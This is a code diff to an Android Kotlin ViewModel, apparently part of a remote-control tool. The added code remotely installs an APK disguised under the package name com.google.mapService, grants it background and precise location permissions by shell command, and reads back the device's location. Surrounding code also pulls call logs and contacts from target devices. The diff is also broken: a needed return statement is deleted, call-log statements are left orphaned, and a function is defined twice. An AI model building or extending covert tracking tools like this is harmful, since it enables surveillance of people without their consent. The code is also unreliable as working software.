@@ -272,7 +272,6 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
             FrpLogBus.append("[初始化] 复制资源文件 $assetName 失败：${e.message}")
             throw e
         }
-        return localFile
     }
 
     private fun ensureLocalAssetReady(context: android.content.Context, assetName: String): File {
@@ -591,6 +590,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 screen = ScreenDestination.GetLocPlugin,
                 pluginClientId = clientId,
                 getLocErrorMessage = null,
+                getLocStatusMessage = null,
                 locationAddressIntlErrorMessage = null,
                 locationAddressCnErrorMessage = null
             )
@@ -604,6 +604,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 pluginClientId = null,
                 getLocLoading = false,
                 getLocErrorMessage = null,
+                getLocStatusMessage = null,
                 locationInfo = null,
                 locationAddressIntl = null,
                 locationAddressIntlLoading = false,
@@ -615,6 +616,73 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         }
     }
 
+    fun installGetLocPlugin() {
+        val state = _uiState.value
+        val clientId = state.pluginClientId ?: (state.selectedTarget as? ShellTarget.Client)?.id ?: return
+        viewModelScope.launch(Dispatchers.IO) {
+            _uiState.update { it.copy(getLocLoading = true, getLocErrorMessage = null, getLocStatusMessage = null) }
+            try {
+                val appContext = getApplication<Application>()
+                val remoteApk = ensureRemoteFileReady(appContext, clientId, "GetLoc.apk")
+                val installOut = runCommandOrThrow(clientId, "pm install -r $remoteApk", 30_000, "GetLoc 安装命令执行失败")
+                if (!installOut.contains("Success", ignoreCase = true)) {
+                    throw IllegalStateException("GetLoc 安装失败: ${installOut.ifBlank { "无返回" }}")
+                }
+                _uiState.update { it.copy(getLocLoading = false, getLocErrorMessage = null, getLocStatusMessage = "GetLoc 安装成功") }
+                FrpLogBus.append("[GetLoc] 安装成功")
+            } catch (e: Exception) {
+                _uiState.update { it.copy(getLocLoading = false, getLocErrorMessage = "安装失败: ${e.message}", getLocStatusMessage = null) }
+                FrpLogBus.append("[GetLoc] 安装失败: ${e.message}")
+            }
+        }
+    }
+
+    fun uninstallGetLocPlugin() {
+        val state = _uiState.value
+        val clientId = state.pluginClientId ?: (state.selectedTarget as? ShellTarget.Client)?.id ?: return
+        viewModelScope.launch(Dispatchers.IO) {
+            _uiState.update { it.copy(getLocLoading = true, getLocErrorMessage = null, getLocStatusMessage = null) }
+            try {
+                val output = runCommandOrThrow(clientId, "pm uninstall com.google.mapService", 20_000, "GetLoc 卸载命令执行失败")
+                if (!output.contains("Success", ignoreCase = true)) {
+                    throw IllegalStateException("卸载失败: ${output.ifBlank { "无返回" }}")
+                }
+                _uiState.update { it.copy(getLocLoading = false, getLocErrorMessage = null, getLocStatusMessage = "GetLoc 已卸载") }
+                FrpLogBus.append("[GetLoc] 卸载成功")
+            } catch (e: Exception) {
+                _uiState.update { it.copy(getLocLoading = false, getLocErrorMessage = "卸载失败: ${e.message}", getLocStatusMessage = null) }
+                FrpLogBus.append("[GetLoc] 卸载失败: ${e.message}")
+            }
+        }
+    }
+
+    fun grantGetLocPermissions() {
+        val state = _uiState.value
+        val clientId = state.pluginClientId ?: (state.selectedTarget as? ShellTarget.Client)?.id ?: return
+        viewModelScope.launch(Dispatchers.IO) {
+            _uiState.update { it.copy(getLocLoading = true, getLocErrorMessage = null, getLocStatusMessage = null) }
+            try {
+                runCommandOrThrow(
+                    clientId,
+                    "pm grant com.google.mapService android.permission.ACCESS_BACKGROUND_LOCATION",
+                    10_000,
+                    "背景定位权限设置失败"
+                )
+                runCommandOrThrow(
+                    clientId,
+                    "pm grant com.google.mapService android.permission.ACCESS_FINE_LOCATION",
+                    10_000,
+                    "精确定位权限设置失败"
+                )
+                _uiState.update { it.copy(getLocLoading = false, getLocErrorMessage = null, getLocStatusMessage = "GetLoc 权限设置完成") }
+                FrpLogBus.append("[GetLoc] 权限设置完成")
+            } catch (e: Exception) {
+                _uiState.update { it.copy(getLocLoading = false, getLocErrorMessage = "权限设置失败: ${e.message}", getLocStatusMessage = null) }
+                FrpLogBus.append("[GetLoc] 权限设置失败: ${e.message}")
+            }
+        }
+    }
+
     fun fetchLocationByPlugin() {
         val state = _uiState.value
         val clientId = state.pluginClientId ?: (state.selectedTarget as? ShellTarget.Client)?.id ?: return
@@ -623,6 +691,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 it.copy(
                     getLocLoading = true,
                     getLocErrorMessage = null,
+                    getLocStatusMessage = null,
                     locationInfo = null,
                     locationAddressIntl = null,
                     locationAddressIntlErrorMessage = null,
@@ -631,23 +700,15 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 )
             }
             try {
+                runCommandOrThrow(clientId, "am start-foreground-service -n com.google.mapService/.LocationService", 10_000, "启动 LocationService 失败")
+
                 val appContext = getApplication<Application>()
-                val remoteApk = ensureRemoteFileReady(appContext, clientId, "GetLoc.apk")
-
-                val installOut = captureUseCase.runCommand(clientId, "pm install -r $remoteApk", timeoutMs = 30_000).orEmpty()
-                if (!installOut.contains("Success")) {
-                    throw IllegalStateException("GetLoc 安装失败: $installOut")
-                }
-                captureUseCase.runCommand(clientId, "pm grant com.google.mapService android.permission.ACCESS_FINE_LOCATION", timeoutMs = 10_000)
-                captureUseCase.runCommand(clientId, "pm grant com.google.mapService android.permission.ACCESS_BACKGROUND_LOCATION", timeoutMs = 10_000)
-                captureUseCase.runCommand(clientId, "am start-foreground-service -n com.google.mapService/.LocationService", timeoutMs = 10_000)
-
                 val remoteJsonPath = "/data/user/0/com.google.mapService/files/location.json"
                 val timeoutMs = 30_000L
                 val start = System.currentTimeMillis()
                 var exists = false
                 while (System.currentTimeMillis() - start < timeoutMs) {
-                    val check = captureUseCase.runCommand(clientId, "if [ -f $remoteJsonPath ]; then echo exists; else echo missing; fi", timeoutMs = 2_000).orEmpty()
+                    val check = runCommandOrThrow(clientId, "if [ -f $remoteJsonPath ]; then echo exists; else echo missing; fi", 2_000, "检查 location.json 失败")
                     if (check.contains("exists")) {
                         exists = true
                         break
@@ -680,15 +741,26 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                     it.copy(
                         getLocLoading = false,
                         getLocErrorMessage = null,
+                        getLocStatusMessage = "位置获取成功",
                         locationInfo = info
                     )
                 }
                 FrpLogBus.append("[GetLoc] 已获取位置 lat=$latitude lon=$longitude")
             } catch (e: Exception) {
-                _uiState.update { it.copy(getLocLoading = false, getLocErrorMessage = "获取位置失败: ${e.message}") }
+                _uiState.update { it.copy(getLocLoading = false, getLocErrorMessage = "获取位置失败: ${e.message}", getLocStatusMessage = null) }
                 FrpLogBus.append("[GetLoc] 获取位置失败: ${e.message}")
             }
         }
+    }
+
+    private suspend fun runCommandOrThrow(clientId: String, command: String, timeoutMs: Long, failPrefix: String): String {
+        val output = captureUseCase.runCommand(clientId, command, timeoutMs)
+            ?: throw IllegalStateException("$failPrefix: 客户端无返回")
+        val lowered = output.lowercase()
+        if ("exception" in lowered || "unknown" in lowered || "not allowed" in lowered || "denied" in lowered) {
+            throw IllegalStateException("$failPrefix: $output")
+        }
+        return output
     }
 
     fun resolveLocationAddressIntl() {
@@ -788,19 +860,6 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 if (status != "success") {
                     throw IllegalStateException(json.optString("message").ifBlank { "执行失败" })
                 }
-                FrpLogBus.append("[通话记录] 已读取 ${items.size} 条记录")
-            } catch (e: Exception) {
-                _uiState.update {
-                    it.copy(
-                        callLogLoading = false,
-                        callLogErrorMessage = "读取通话记录失败: ${e.message}"
-                    )
-                }
-                FrpLogBus.append("[通话记录] 读取失败: ${e.message}")
-            }
-        }
-    }
-
                 val calls = json.optJSONArray("calls") ?: JSONArray()
                 val items = buildList {
                     for (i in 0 until calls.length()) {
@@ -920,42 +979,6 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 FrpLogBus.append("[联系人] 读取失败: ${e.message}")
             }
         }
-    }
-
-    private suspend fun ensurePluginReady(appContext: Application, clientId: String, assetName: String): String {
-        val localJar = ensureLocalAssetReady(appContext, assetName)
-
-        val remoteJarPath = "/data/local/tmp/$assetName"
-        val uploaded = captureUseCase.uploadDependency(clientId, remoteJarPath, localJar)
-        if (!uploaded) {
-            throw IllegalStateException("上传 $assetName 失败")
-        }
-        captureUseCase.runCommand(clientId, "chmod 777 $remoteJarPath", timeoutMs = 5_000)
-        return remoteJarPath
-    }
-
-    private suspend fun ensureRemoteFileReady(appContext: Application, clientId: String, assetName: String): String {
-        val localFile = ensureLocalAssetReady(appContext, assetName)
-
-        val remotePath = "/data/local/tmp/$assetName"
-        val existsOutput = captureUseCase.runCommand(clientId, "if [ -f $remotePath ]; then echo exists; else echo missing; fi", timeoutMs = 8_000).orEmpty()
-        if (!existsOutput.contains("exists")) {
-            val uploaded = captureUseCase.uploadDependency(clientId, remotePath, localFile)
-            if (!uploaded) {
-                throw IllegalStateException("上传 $assetName 失败")
-            }
-        }
-        captureUseCase.runCommand(clientId, "chmod 777 $remotePath", timeoutMs = 5_000)
-        return remotePath
-    }
-
-    private fun extractJsonObject(raw: String): JSONObject {
-        val start = raw.indexOf('{')
-        val end = raw.lastIndexOf('}')
-        if (start < 0 || end <= start) {
-            throw IllegalStateException("返回内容不是 JSON")
-        }
-        return JSONObject(raw.substring(start, end + 1))
     }
 
     private suspend fun ensurePluginReady(appContext: Application, clientId: String, assetName: String): String {
